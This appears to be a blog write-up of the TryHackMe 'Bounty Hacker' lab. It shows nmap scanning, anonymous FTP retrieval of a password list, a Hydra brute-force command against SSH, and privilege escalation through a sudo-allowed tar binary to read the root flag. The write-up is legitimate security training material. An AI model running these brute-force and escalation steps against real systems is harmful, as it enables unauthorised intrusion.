---
title: "Bounty Hacker - TryHackMe"
date: 2026-03-24 02:17:00 +0000
categories: [TryHackMe, Writeups]
tags: [brute-force, ftp, ssh, privilege-escalation]
image: /assets/img/writeups/covers/bounty-hacker.jpeg
---
# Bounty Hacker - TryHackMe
![1.png](/assets/img/writeups/bounty-hacker/1.png)
**Difficulty**: Easy<br>**Time Required**: 35 min<br>
[Bounty Hacker](https://tryhackme.com/room/bountyhacker) is an easy-level room that introduces basic penetration testing techniques. In this challenge, we start with reconnaissance to discover open services like FTP and SSH, gain initial access by retrieving sensitive files, and use password attacks to log in. Finally, we perform privilege escalation using a misconfigured sudo permission to obtain root access.
## Reconnaissance
Scanning with `nmap`
````
└─$ nmap -p- 10.65.129.136 -sV -T4
Nmap scan report for 10.65.129.136 (10.65.129.136)
Host is up (0.23s latency).
Not shown: 55529 filtered tcp ports (no-response), 10003 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
````
**Open ports**:
- 22 - SSH
- 21 - FTP
- 80 - HTTP

First, we connect to port 21 using the command `ftp 10.65.129.136`, since this port is used for FTP. This lets us check if the FTP service is running and accessible.<br>Next, log in using any username and use the `get` command to download the files.
````
└─$ ftp 10.65.129.136
Connected to 10.65.129.136.
220 (vsFTPd 3.0.5)
Name (10.65.129.136:monasx0): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |******************************************************************|   418        4.33 MiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (1.74 KiB/s)
ftp> get task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |******************************************************************|    68      809.83 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.28 KiB/s)
````
Finally, open the downloaded files and note the name mentioned in `task.txt`.
````
--> cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
--> cat locks.txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
...
````
Now that we have a username and a list of passwords, and from the Nmap scan we know SSH is running, we can try to log in by testing those passwords using Hydra with a command like `hydra -l lin -P locks.txt ssh://10.65.129.136`.
![2.png](/assets/img/writeups/bounty-hacker/2.png)
Once the correct credentials are found, log in to SSH using them.
```
--> ssh lin@10.65.129.136
The authenticity of host '10.65.129.136 (10.65.129.136)' can't be established.
ED25519 key fingerprint is: SHA256:kS3tei6sVM3kiAwPn6/nVwUyni1FDxhTRs2DiGJ5g2s
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.65.129.136' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
lin@10.65.129.136's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Mon Aug 11 12:32:35 2025 from 10.23.8.228
lin@ip-10-65-129-136:~/Desktop$
```
After logging in, locate and open the user flag.
````
lin@ip-10-65-129-136:~/Desktop$ ls
user.txt
lin@ip-10-65-129-136:~/Desktop$ cat user.txt
````
After running `sudo -l`, we see that the user lin is allowed to run `/bin/tar` as root. This means we can run `tar` as root, which can be leveraged to escalate privileges.
```
lin@ip-10-65-129-136:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on ip-10-65-129-136:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-65-129-136:
    (root) /bin/tar
```
Next, go to GTFOBins, search for `tar`, and scroll to the file read section. Copy the command and modify it to target the `root.txt` file.
![3.png](/assets/img/writeups/bounty-hacker/3.png)
![4.png](/assets/img/writeups/bounty-hacker/4.png)
Then, edit `/path/to/input-file` and replace it with `/root/root.txt`.
![5.png](/assets/img/writeups/bounty-hacker/5.png)
Running the modified command allows us to read `/root/root.txt`, successfully retrieving the root flag.<br>With both `user.txt` and `root.txt` captured, the box is fully compromised.
